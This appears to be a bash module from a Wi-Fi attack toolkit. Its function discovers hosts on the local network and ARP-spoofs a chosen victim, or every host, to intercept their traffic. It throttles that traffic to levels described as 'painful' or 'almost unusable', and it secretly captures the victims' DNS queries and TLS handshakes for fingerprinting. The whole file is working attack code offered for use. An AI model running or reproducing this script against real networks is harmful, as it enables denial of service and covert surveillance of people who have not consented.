#!/bin/bash

_throttle_cleanup() {
    echo
    echo -e "${BOLD_CYAN}[+]${NC} Removing traffic shaping rules..."
    tc qdisc del dev "$iface" root 2>/dev/null

    echo -e "${BOLD_CYAN}[+]${NC} Stopping ARP spoof..."
    pkill -f "arpspoof -i $iface" 2>/dev/null
    sleep 1

    echo -e "${BOLD_CYAN}[+]${NC} Disabling IP forwarding..."
    echo 0 > /proc/sys/net/ipv4/ip_forward
}

throttle_client() {

# mode: "single" = skip all-hosts option, "all" = skip picker go straight to all, default = show picker
local mode="${1:-pick}"

# Dependency check
if ! command -v arpspoof &>/dev/null; then
    echo -e "${BOLD_RED}[!]${NC} arpspoof not found."
    echo -e "    ${DIM}Install with: apt install dsniff${NC}"
    pause
    return
fi

if [[ -z "$iface" ]]; then
    select_interface
    [[ -z "$iface" ]] && return
fi

# Interface must have an IP (managed mode)
local our_ip
our_ip=$(ip -4 addr show "$iface" 2>/dev/null | awk '/inet /{print $2}' | cut -d'/' -f1 | head -n1)

if [[ -z "$our_ip" ]]; then
    echo -e "${BOLD_RED}[!]${NC} ${BOLD_GREEN}${iface}${NC} has no IP — must be connected to the network in managed mode."
    pause
    return
fi

# Get gateway
local gateway
gateway=$(ip route show dev "$iface" 2>/dev/null | awk '/default/{print $3}' | head -n1)

if [[ -z "$gateway" ]]; then
    echo -e "${BOLD_RED}[!]${NC} Could not determine gateway for ${BOLD_GREEN}${iface}${NC}."
    pause
    return
fi

# Discover hosts
clear
echo -e "${BOLD_CYAN}[+]${NC} Discovering hosts on network..."
echo

local subnet
subnet=$(ip -o -f inet addr show "$iface" 2>/dev/null | awk '{print $4}' | head -n1)

local hosts
hosts=$(nmap -sn -T4 "$subnet" 2>/dev/null \
    | awk '/Nmap scan report/{ip=$NF} /MAC Address/{mac=$3; print ip, mac}' \
    | grep -v "$our_ip")

if [[ -z "$hosts" ]]; then
    echo -e "${BOLD_YELLOW}[!]${NC} No hosts found on the network."
    pause
    return
fi

local host_count
host_count=$(echo "$hosts" | wc -l)

local target_choice=""
if [[ "$mode" != "all" ]]; then
    clear
    echo -e "${BOLD_CYAN}Select target to throttle:${NC}"
    echo
    echo "$hosts" | nl -w2 -s') '
    echo
    [[ "$mode" == "pick" ]] && echo -e "  ${BOLD_YELLOW}$((host_count + 1)))${NC} ALL hosts"
    echo
    read -p "  Choice: " target_choice
fi

local target_ip=""
local target_all=false

if [[ "$mode" == "all" ]]; then
    target_all=true
elif [[ "$mode" == "single" ]]; then
    target_ip=$(echo "$hosts" | sed -n "${target_choice}p" | awk '{print $1}')
    if [[ -z "$target_ip" ]]; then
        echo -e "${BOLD_RED}[!]${NC} Invalid selection."
        pause
        return
    fi
elif [[ "$target_choice" == "$((host_count + 1))" ]]; then
    target_all=true
else
    target_ip=$(echo "$hosts" | sed -n "${target_choice}p" | awk '{print $1}')
    if [[ -z "$target_ip" ]]; then
        echo -e "${BOLD_RED}[!]${NC} Invalid selection."
        pause
        return
    fi
fi

# Pick throttle level
echo
echo -e "${BOLD_CYAN}Throttle level:${NC}"
echo -e "  ${BOLD_CYAN}[1]${NC} Slow    ${DIM}(512 KB/s — streams will buffer)${NC}"
echo -e "  ${BOLD_CYAN}[2]${NC} Painful ${DIM}(128 KB/s — pages load slow)${NC}"
echo -e "  ${BOLD_CYAN}[3]${NC} Crawl   ${DIM}(32 KB/s  — almost unusable)${NC}"
echo -e "  ${BOLD_CYAN}[4]${NC} Custom  ${DIM}(enter KB/s manually)${NC}"
echo
read -p "  Choice [default: 2]: " level_choice

local rate_kbit rate_label
case "$level_choice" in
    1)
        rate_kbit=4096
        rate_label="512 KB/s"
        ;;
    3)
        rate_kbit=256
        rate_label="32 KB/s"
        ;;
    4)
        read -p "  Enter rate in KB/s: " custom_kbs
        if ! [[ "$custom_kbs" =~ ^[0-9]+$ ]] || (( custom_kbs < 1 )); then
            echo -e "${BOLD_RED}[!]${NC} Invalid rate."
            pause
            return
        fi
        rate_kbit=$(( custom_kbs * 8 ))
        rate_label="${custom_kbs} KB/s"
        ;;
    *)
        rate_kbit=1024
        rate_label="128 KB/s"
        ;;
esac

# Confirm
echo
if $target_all; then
    echo -e "${BOLD_RED}[!]${NC} This will throttle ${BOLD_RED}ALL${NC} hosts on the network to ${BOLD_GREEN}${rate_label}${NC}."
else
    echo -e "${BOLD_RED}[!]${NC} This will throttle ${BOLD_GREEN}${target_ip}${NC} to ${BOLD_GREEN}${rate_label}${NC}."
fi
echo -e "    ${DIM}Gateway : ${gateway}${NC}"
echo -e "    ${DIM}Via     : ${iface} (${our_ip})${NC}"
echo
read -p "  Confirm? [y/N] " confirm
[[ "$confirm" =~ ^[Yy]$ ]] || return

# Temp files for background analysis
local _core_dir
_core_dir="$(dirname "${BASH_SOURCE[0]}")"
local _dns_pcap="/tmp/wificli_dns_$$.pcap"
local _ja3_pcap="/tmp/wificli_ja3_$$.pcap"
local _dns_pid="" _ja3_pid=""

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Apply tc rate limit on our interface
tc qdisc del dev "$iface" root 2>/dev/null
tc qdisc add dev "$iface" root tbf rate "${rate_kbit}kbit" burst 32kbit latency 400ms

# Start ARP spoofing
clear
if $target_all; then
    while IFS=' ' read -r ip _; do
        arpspoof -i "$iface" -t "$ip"      "$gateway" &>/dev/null &
        arpspoof -i "$iface" -t "$gateway" "$ip"      &>/dev/null &
    done <<< "$hosts"
    echo -e "${BOLD_RED}[+]${NC} Throttling ${BOLD_RED}ALL${NC} hosts at ${BOLD_GREEN}${rate_label}${NC}"
else
    arpspoof -i "$iface" -t "$target_ip"  "$gateway" &>/dev/null &
    arpspoof -i "$iface" -t "$gateway"   "$target_ip" &>/dev/null &
    echo -e "${BOLD_RED}[+]${NC} Throttling ${BOLD_GREEN}${target_ip}${NC} at ${BOLD_GREEN}${rate_label}${NC}"
fi

# Start background DNS capture
if command -v tcpdump &>/dev/null; then
    tcpdump -i "$iface" -w "$_dns_pcap" port 53 &>/dev/null &
    _dns_pid=$!
    echo -e "${BOLD_CYAN}[+]${NC} ${DIM}DNS capture started${NC}"
fi

# Start background TLS capture for JA3 analysis
if [[ -x "${_core_dir}/ja3.sh" ]] && command -v tcpdump &>/dev/null; then
    tcpdump -i "$iface" -w "$_ja3_pcap" \
        "tcp port 443 or tcp port 8443 or tcp port 5228" &>/dev/null &
    _ja3_pid=$!
    echo -e "${BOLD_CYAN}[+]${NC} ${DIM}TLS capture started${NC}"
fi

echo
echo -e "${DIM}  Press Enter to stop...${NC}"
read

# Stop background captures
[[ -n "$_dns_pid" ]] && kill "$_dns_pid" 2>/dev/null; wait "$_dns_pid" 2>/dev/null || true
[[ -n "$_ja3_pid" ]] && kill "$_ja3_pid" 2>/dev/null; wait "$_ja3_pid" 2>/dev/null || true

_throttle_cleanup

# Display DNS intelligence summary
if [[ -x "${_core_dir}/dns.sh" && -f "$_dns_pcap" ]] && \
   tcpdump -r "$_dns_pcap" -c 1 &>/dev/null 2>&1; then
    echo
    echo -e "${BOLD_CYAN}========== DNS Intelligence ==========${NC}"
    bash "${_core_dir}/dns.sh" -f "$_dns_pcap"
fi

# Display JA3 TLS fingerprint summary
if [[ -x "${_core_dir}/ja3.sh" && -f "$_ja3_pcap" ]] && \
   tcpdump -r "$_ja3_pcap" -c 1 &>/dev/null 2>&1; then
    echo
    echo -e "${BOLD_CYAN}========== TLS Fingerprints (JA3) ==========${NC}"
    bash "${_core_dir}/ja3.sh" -f "$_ja3_pcap"
fi

rm -f "$_dns_pcap" "$_ja3_pcap" 2>/dev/null

pause
}
